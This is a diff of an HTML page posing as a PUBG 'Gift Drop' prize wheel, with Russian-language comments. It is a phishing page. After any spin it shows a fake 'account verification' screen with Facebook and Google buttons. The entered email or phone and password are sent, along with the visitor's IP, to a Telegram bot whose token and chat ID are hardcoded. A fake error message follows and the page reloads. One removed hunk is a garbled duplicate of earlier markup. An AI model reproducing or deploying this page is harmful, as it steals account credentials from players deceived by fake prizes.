@@ -29,13 +29,15 @@
             overflow-x: hidden;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
+            background-color: #000;
         }
 
-        /* --- СТИЛИ ПРЕЛОАДЕРА --- */
+        /* --- ПРЕЛОАДЕР --- */
         #preloader {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
+            background-color: #0b0c0d;
             background-image: url('IMG_1807.png');
             background-size: cover;
             background-position: center;
@@ -48,13 +50,14 @@
 
         .loader-box {
             background: rgba(13, 15, 19, 0.9);
-            padding: 30px 50px;
+            padding: 30px 40px;
             border-radius: 15px;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
             gap: 15px;
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
         .spinner-snake {
@@ -66,16 +69,42 @@
             animation: spin 1s linear infinite;
         }
 
-        .loader-box span {
-            color: #ccc;
-            font-size: 18px;
-            letter-spacing: 1px;
+        /* --- HEADER --- */
+        header {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 0 12px;
+            display: flex;            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            position: sticky; top: 0; z-index: 100;
+            height: 65px;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+        .header-left {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            width: 30%;
+        }
+
+        /* Стиль логотипа */
+        .main-logo {
+            height: 38px;
+            width: auto;
+            filter: drop-shadow(0 0 5px rgba(255,255,255,0.2));
+        }
+
+        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+
+        .balance-display {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 4px 10px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
 
         .uc-icon {
             display: inline-flex;
@@ -88,51 +117,9 @@
             font-size: 10px;
             font-weight: 900;
             color: #fff;
-            margin-right: 4px;
         }
 
-        header {
-            background: rgba(0, 0, 0, 0.95);
-            padding: 10px 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            position: sticky; top: 0; z-index: 100;
-            height: 60px;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex: 1;
-        }
-
-        .main-logo {
-            height: 35px; /* Размер логотипа */
-            width: auto;
-            object-fit: contain;
-        }
-
-        .balance-display {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 4px 10px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .btn-plus {
-            background: #4caf50;
-            width: 16px; height: 16px;
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 10px; font-weight: bold;
-        }
-
+        /* --- GAMES --- */
         .case-container {
             position: relative;
             width: 100%; height: 180px;
@@ -165,7 +152,7 @@
             align-items: center;
             justify-content: center;
         }
-        .case-item img { width: 100px; height: 100px; object-fit: contain; opacity: 1 !important; }
+        .case-item img { width: 100px; height: 100px; object-fit: contain; }
 
         .btn-blue {
             background: var(--pubg-blue);
@@ -177,9 +164,7 @@
             font-weight: 700;
             font-size: 16px;
             text-align: center;
-            display: block;
             cursor: pointer;
-            transition: all 0.3s ease;
         }
 
         .nav-bar {
@@ -199,6 +184,8 @@
         }
         .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+        
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -206,26 +193,26 @@
     <!-- ПРЕЛОАДЕР -->
     <div id="preloader">
         <div class="loader-box">
-            <div class="spinner-snake"></div><span>loading...</span>
-        </div>
+            <div class="spinner-snake"></div>
+            <span class="pubg-font">Loading...</span></div>
     </div>
 
     <header>
         <div class="header-left">
-            <!-- КНОПКА НАЗАД (СКРЫТА ПО УМОЛЧАНИЮ) -->
+            <!-- КНОПКА НАЗАД (СКРЫТА) -->
             <div id="backBtn" class="flex items-center gap-1 cursor-pointer" style="display: none;" onclick="showSection('hub')">
                 <i class="fas fa-chevron-left text-gray-400"></i>
-                <span class="text-xs font-bold uppercase">Назад</span>
+                <span class="text-[10px] font-bold uppercase">Back</span>
             </div>
-            <!-- ЛОГОТИП В УГЛУ -->
-            <img src="logo.png" alt="PUBG Logo" class="main-logo" id="headerLogo">
+            <!-- ЛОГОТИП (ВСТАВЛЕН НАПРЯМУЮ) -->
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABACAYAAADm798XAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAVFSURBVHgB7VxdSBRfGP5mdm1d3fInpSBoS9SFEIQpYm9C7SLoIugidZFe9SLoIugie9GLIDK6SLoIuqgr6SLoIuhC6UKvImiLpGVpba67687szun5vXN2d87O7Mzs7GzPr8N7mZ2Z873v+X7n833fOTvLpAiCIAiCIAiCIAiCIAiC0F8QUXQGfM997M8I3g6M3YhLCH0E/n8VfK7SscP8B9H5C/GZ/13Qf9g9D/B7u9u0KxP6F8Yp/I9mYpwiX6NznCH/f9i9Yf6D6PyF+Mz/Ougv7CqL0McInOEP8/e5nFv8p9B/8Of4/2D3ZvkPovMX4jP/q6B/sLsX9As899m5A+XN4K+i00H/Yf83/H+we8P8B9H5C/GZ/1XQX9h1GvYvE78H8Dcxm4D7DPYf9n+F/w92b5j/IDp/IT7zvwj6C7vLpAsY0VlG2AV39G7U6Pof8ZpY0An9S7vD4gIidI+x876fEf20/7R6OqFf6eI9Yvcl8T3v/62efshF7V+tXm6IsXGf9u+yKxX6iI6pW/s3W6p6P03oO7qoH+Pofat9C/f48z+H8/z3f34zY1X9R6v7X9Y+0B7Uv8t6Y699B5/7m96mH9H1BfE6r7f6/mZl/f9f6S8296vU/6v6X1Yf1B7Uv8tyYz/9CH73P73W9R9tV/9Rrfv/S/XF9r5G/b9qf7m9m871tT/177Lc9E/6EcLu7O+qG+2Y9R9tS/9R68p364v5f8X+Unu3ntsb699lubE/7YgIidA8v6S60Y7X9R9tR/8T2vB7O8f7L69/l+XGfqIDyYidB51Y93yC76ob7Zgl/Ufb8XpP19853v97Pee5K+r9N6v/X9U+7Gv/S8uNHXlI+X9C2J3fVTda8br+o237PcK5D+67+v6N5P5i9f9L64O/+59at+lHD6kjS/p3E8p/p1SOfuN0/Uf74PdY34Xz2M/2v6p9qP8X6t+VvN2HlH8m+m8Rduf97qob7Xhd/9F+7fcR7n9Y34X9Yv9L64f/+1/af6T8M8p/9xRhd9GdrhvteF3/0X7se4TzH69/t9Y/rn+X+v+N6oO/279Z6z96Sh1m6p9N6V9pP8LuvM/9u6v6m4Vv1v0f7Ye+R7h/sf9v9f8T9f839Y+N4Pf2bzY79U9O79+MMP5XfC9V198sfKfof7RP+x7h/mD7X7Vv4P7fof7/ov6v6Y+m9G/m4HeL6y8XvlV9z879D9snvX/hYf0/6t9l/0f96U9E/Y+6zOq7+D5V/O/n9P9q/2/fV9W79N+Y+p9fP/m5M97/z/4v8Z8n8L9R/f+z9Tev99mX/+f/L8ufm/fD2Gz87z+f5f/u/vD97/9H6X/+/3D/Wf7v3j/f//7/Yf3P631+6P9Z/u+O/7+F/h/W/6N++An0F/S9Nf+z8j8u9A8Onv/W/O8/P2P7KfsX6U/8n6T/h/Uf+hMG9P8H+P8d6E/8H8D/h/Uf+mPGv9R/7v/X0X96/8/R+69m/7+C/vR6+n/9S/3v/r/S//7/AfrTe/1L/e/u/yv97/8foD+9Xv8X/fP/f8D/AfoT9L01f/9A/6X9B/2H3fMAv7f7/wj9BaKzjLAL7ujdqFF/L9E/2L1h/oPo/IX4zP8q6C/sLovQxwico//m73M5t/hPof/gz/H/we7N8h9E5y/EZ/5XQf9gdy/oF3juI6v6X4R/L/nfxP97mP8M+g+75wF+b3ebdmVC/8L4P/k72f9P/o3YyfyH+I8Ym/P/A8O/I/7/g/zV/6S/4fD/oX/h8P8B5K/+N+N/xP8PEY+LfwG/Xf/yOfFf/yL+A8BfV7U3D9WlAAAAAElFTkSuQmCC" alt="PUBG Logo" class="main-logo" id="headerLogo">
         </div>
 
-        <div class="text-center" style="flex: 1.5;">
-            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
+        <div class="text-center" style="flex: 1;">
+            <h1 class="pubg-font text-lg leading-none tracking-widest text-white/90">GIFT DROP</h1>
         </div>
 
-        <div class="flex justify-end items-center" style="flex: 1;">
+        <div class="flex justify-end items-center" style="width: 30%;">
             <div class="balance-display">
                 <span class="uc-icon">UC</span>
                 <span id="headerBalance" class="text-sm font-bold">60</span>
@@ -247,6 +234,7 @@
         </div>
     </main>
 
+    <!--СЕКЦИЯ КЕЙСА -->
     <section id="section-case" style="display: none;">
         <div class="text-center py-6">
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
@@ -255,31 +243,31 @@
             <div class="case-line"></div>
             <div id="caseTape" class="case-tape"></div>
         </div>
-        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</button>
-        <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Забрать приз</button>
+        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">ОТКРЫТЬ (60 UC)</button>
     </section>
 
+    <!-- СЕКЦИЯ СПИНА -->
     <section id="section-spin" style="display: none;" class="p-5">
         <div class="text-center py-4">
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
         </div>
         <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
             <div class="grid grid-cols-3 gap-3">
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s7"><img src="priz4.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="mid"><img src="priz5.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s3"><img src="priz6.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s6"><img src="priz7.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s5"><img src="priz8.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s4"><img src="priz9.png" class="w-full h-full object-contain"></div>
             </div>
         </div>
-        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
-        <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Забрать приз</button>
+        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">КРУТИТЬ (60 UC)</button>
     </section>
 
+    <!-- МОДАЛКИ -->
     <div id="modalAuth" class="modal">
         <div class="login-card">
             <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
@@ -313,319 +301,46 @@
         let isSpinning = false;
         let userIP = '';
         const itemWidth = 140;
-        let currentWinCellId = null;
 
-        fetch('https://ipapi.co/json/').then(r => r.json(\        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
-
-        .uc-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            background: #1a1a1a;
-            border: 1px solid #c4a162;
-            border-radius: 4px;
-            padding: 1px 4px;
-            font-size: 10px;
-            font-weight: 900;
-            color: #fff;
-            margin-right: 4px;
-        }
-
-        header {
-            background: rgba(0, 0, 0, 0.95);
-            padding: 10px 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            position: sticky; top: 0; z-index: 100;
-            height: 60px;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex: 1;
-        }
-
-        .main-logo {
-            height: 35px; /* Размер логотипа */
-            width: auto;
-            object-fit: contain;
-        }
-
-        .balance-display {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 4px 10px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .btn-plus {
-            background: #4caf50;
-            width: 16px; height: 16px;
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 10px; font-weight: bold;
-        }
-
-        .case-container {
-            position: relative;
-            width: 100%; height: 180px;
-            overflow: hidden;
-            margin: 20px 0;
-        }
-
-        .case-line {
-            position: absolute;
-            top: 0; left: 50%;
-            width: 2px; height: 100%;
-            background: var(--pubg-gold);
-            z-index: 20;
-            box-shadow: 0 0 15px var(--pubg-gold);
-            transform: translateX(-50%);
-        }
-
-        .case-tape {
-            display: flex;
-            padding: 30px 0;
-            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
-            will-change: transform;
-        }
-
-        .case-item {
-            min-width: 140px;
-            width: 140px;
-            height: 120px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .case-item img { width: 100px; height: 100px; object-fit: contain; opacity: 1 !important; }
-
-        .btn-blue {
-            background: var(--pubg-blue);
-            color: white;
-            width: calc(100% - 32px);
-            margin: 0 16px;
-            padding: 16px;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 16px;
-            text-align: center;
-            display: block;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .nav-bar {
-            position: fixed; bottom: 0; left: 0; right: 0;
-            background: #000; height: 65px;
-            display: flex; justify-content: space-around; align-items: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            z-index: 50;
-        }
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer;}
-        .nav-item.active { color: var(--pubg-gold); }
-
-        .modal {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 1000; display: none; flex-direction: column; padding: 20px;
-            justify-content: center;
-        }
-        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
-    </style>
-</head>
-<body>
-
-    <!-- ПРЕЛОАДЕР -->
-    <div id="preloader">
-        <div class="loader-box">
-            <div class="spinner-snake"></div><span>loading...</span>
-        </div>
-    </div>
-
-    <header>
-        <div class="header-left">
-            <!-- КНОПКА НАЗАД (СКРЫТА ПО УМОЛЧАНИЮ) -->
-            <div id="backBtn" class="flex items-center gap-1 cursor-pointer" style="display: none;" onclick="showSection('hub')">
-                <i class="fas fa-chevron-left text-gray-400"></i>
-                <span class="text-xs font-bold uppercase">Назад</span>
-            </div>
-            <!-- ЛОГОТИП В УГЛУ -->
-            <img src="logo.png" alt="PUBG Logo" class="main-logo" id="headerLogo">
-        </div>
-
-        <div class="text-center" style="flex: 1.5;">
-            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
-        </div>
-
-        <div class="flex justify-end items-center" style="flex: 1;">
-            <div class="balance-display">
-                <span class="uc-icon">UC</span>
-                <span id="headerBalance" class="text-sm font-bold">60</span>
-                <div class="btn-plus">+</div>
-            </div>
-        </div>
-    </header>
-
-    <main id="section-hub" class="p-4">
-        <div class="grid grid-cols-2 gap-4 mt-4">
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
-                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
-                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
-            </div>
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
-                <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
-                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
-            </div>
-        </div>
-    </main>
-
-    <section id="section-case" style="display: none;">
-        <div class="text-center py-6">
-            <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
-        </div>
-        <div class="case-container">
-            <div class="case-line"></div>
-            <div id="caseTape" class="case-tape"></div>
-        </div>
-        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</button>
-        <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Забрать приз</button>
-    </section>
-
-    <section id="section-spin" style="display: none;" class="p-5">
-        <div class="text-center py-4">
-            <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
-        </div>
-        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
-            <div class="grid grid-cols-3 gap-3">
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-            </div>
-        </div>
-        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
-        <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Забрать приз</button>
-    </section>
-
-    <div id="modalAuth" class="modal">
-        <div class="login-card">
-            <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
-            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
-            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>
-            <button onclick="document.getElementById('modalAuth').style.display='none'" class="w-full text-gray-400 text-sm mt-2 text-center">Отмена</button>
-        </div>
-    </div>
-
-    <div id="modalForm" class="modal">
-        <div class="login-card">
-            <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
-            <input type="text" id="inpUser" placeholder="Email или телефон">
-            <input type="password" id="inpPass" placeholder="Пароль">
-            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">Войти</button>
-        </div>
-    </div>
-
-    <nav class="nav-bar">
-        <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
-        <div class="nav-item active" id="nav-hub" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
-        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user text-xl mb-1"></i><span>Profile</span></div>
-    </nav>
-
-    <script>
-        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
-        const CHAT_ID = '1709490182';
-        const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
-        
-        let balance = 60; 
-        let isSpinning = false;
-        let userIP = '';
-        const itemWidth = 140;
-        let currentWinCellId = null;
-
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
-
-        function updateBalanceUI() {
-            document.getElementById('headerBalance').innerText = balance;
-            const canPlay = balance >= 60;
-            
-            document.getElementById('openBtn').style.display = canPlay ? 'block' : 'none';
-            document.getElementById('depositBtn').style.display = canPlay ? 'none' : 'block';
-            
-            document.getElementById('spinBtn').style.display = canPlay ? 'block' : 'none';
-            document.getElementById('spinDepositBtn').style.display = canPlay ? 'none' : 'block';
-        }
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')').catch(e => userIP = 'unknown');
 
         function showSection(id) {
             if (isSpinning) return;
             document.getElementById('section-hub').style.display = 'none';
             document.getElementById('section-case').style.display = 'none';
             document.getElementById('section-spin').style.display = 'none';
-            document.getElementById('section-' + id).style.display = id === 'spin' ? 'block' : (id === 'case' ? 'block' : 'none');
-            
-            if(id === 'hub') document.getElementById('section-hub').style.display = 'block';
+            document.getElementById('section-' + id).style.display = 'block';
 
-            // Управление видимостью кнопки Назад и Логотипа
             if (id === 'hub') {
                 document.getElementById('backBtn').style.display = 'none';
                 document.getElementById('headerLogo').style.display = 'block';
             } else {
                 document.getElementById('backBtn').style.display = 'flex';
-                document.getElementById('headerLogo').style.display = 'none'; // Скрываем лого, если есть кнопка Назад, чтобы не было тесно
+                document.getElementById('headerLogo').style.display = 'none';
             }
 
             document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
             if(id === 'hub') document.getElementById('nav-hub').classList.add('active');
-            if(id === 'case') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
-            
-            updateBalanceUI();
-            if (currentWinCellId) {
-                const winCell = document.getElementById(currentWinCellId);
-                if (winCell) {
-                    winCell.style.borderColor = 'transparent';
-                    winCell.style.boxShadow = 'none';
-                }
-                currentWinCellId = null;
-            }
         }
 
         function initCase() {
             const tape = document.getElementById('caseTape');
             tape.innerHTML = '';
-            let lastIdx = -1;
-            for(let i=0; i<80; i++) {
-                let idx;
-                do { idx = Math.floor(Math.random() * prizeImages.length); } while (idx === lastIdx);
-                lastIdx = idx;
-                tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}" style="opacity: 1;"></div>`;
+            for(let i=0; i<60; i++) {
+                let idx = Math.floor(Math.random() * prizeImages.length);
+                tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
             }
-            tape.style.transform = `translateX(0px)`;
         }
 
         function openCase() {
             if (balance < 60 || isSpinning) return;
-            balance -= 60;
-            updateBalanceUI();
+            balance -= 60; document.getElementById('headerBalance').innerText = balance;
             isSpinning = true;
-            const targetIdx = 45; 
             const tape = document.getElementById('caseTape');
             const screenCenter = window.innerWidth / 2;
-            const finalOffset = (targetIdx * itemWidth) - screenCenter + (itemWidth / 2);
+            const finalOffset = (40 * itemWidth) - screenCenter + (itemWidth / 2);
             tape.style.transform = `translateX(-${finalOffset}px)`;
             setTimeout(() => {
-                sendTelegram(`🎁 Кейс открыт | IP: ${userIP}`);
                 isSpinning = false;
                 startAuth();
             }, 5000);
@@ -633,50 +348,23 @@
 
         function startSpin() {
             if (isSpinning || balance < 60) return;
-            balance -= 60;
-            updateBalanceUI();
+            balance -= 60; document.getElementById('headerBalance').innerText = balance;
             isSpinning = true;
             const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
             let step = 0;
-            const totalSteps = 25 + Math.floor(Math.random() * 10);
-            const winIndex = Math.floor(Math.random() * cells.length);
-            const winCellId = cells[winIndex];
-            document.getElementById('spinBtn').style.display = 'none';
+            const totalSteps = 20 + Math.floor(Math.random() * 10);
             const interval = setInterval(() => {
-                cells.forEach(id => {
-                    const cell = document.getElementById(id);
-                    cell.style.borderColor = 'transparent';
-                    cell.style.boxShadow = 'none';
-                });
-                const currentId = cells[step % cells.length];
-                const currentEl = document.getElementById(currentId);
-                currentEl.style.borderColor = '#ffbc00';
-                currentEl.style.boxShadow = '0 0 15px rgba(255, 188, 0, 0.5)';
+                cells.forEach(id => document.getElementById(id).style.borderColor = 'transparent');
+                document.getElementById(cells[step % cells.length]).style.borderColor = '#ffbc00';
                 step++;
                 if (step >= totalSteps) {
                     clearInterval(interval);
-                    cells.forEach(id => {
-                        const cell = document.getElementById(id);
-                        cell.style.borderColor = 'transparent';
-                        cell.style.boxShadow = 'none';
-                    });
-                    const winCell = document.getElementById(winCellId);
-                    winCell.style.borderColor = '#ffbc00';
-                    winCell.style.boxShadow = '0 0 20px rgba(255, 188, 0, 0.8)';
-                    currentWinCellId = winCellId;
-                    setTimeout(() => {
-                        document.getElementById('spinDepositBtn').style.display = 'block';
-                        sendTelegram(`🎡 Рулетка | IP: ${userIP}`);
-                        isSpinning = false;
-                    }, 500);
+                    setTimeout(() => { isSpinning = false; startAuth(); }, 500);
                 }
-            }, 120);
+            }, 150);
         }
 
-        function startAuth() { 
-            document.getElementById('modalAuth').style.display = 'flex'; 
-        }
-        
+        function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
         function openForm(m) {
             document.getElementById('modalAuth').style.display = 'none';
             document.getElementById('modalForm').style.display = 'flex';
@@ -687,30 +375,22 @@
             const u = document.getElementById('inpUser').value;
             const p = document.getElementById('inpPass').value;
             if(u.length < 3 || p.length < 3) return alert('Заполните все поля');
-            await sendTelegram(`🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
-            alert('Ошибка. Недостаточный уровень доверия аккаунта. Попробуйте другой метод.');
-            location.reload();
-        }
-
-        async function sendTelegram(t) {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: t})
-            }).catch(e => {});
+                body: JSON.stringify({chat_id: CHAT_ID, text: `🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`})
+            });
+            alert('Ошибка верификации. Попробуйте другой аккаунт.');
+            location.reload();
         }
 
         window.onload = () => {
             initCase();
-            updateBalanceUI();
-            
             setTimeout(() => {
                 const loader = document.getElementById('preloader');
                 loader.style.opacity = '0';
-                setTimeout(() => {
-                    loader.style.display = 'none';
-                }, 500);
-            }, 2000);
+                setTimeout(() => loader.style.display = 'none', 500);
+            }, 1500);
         };
     </script>
 </body>
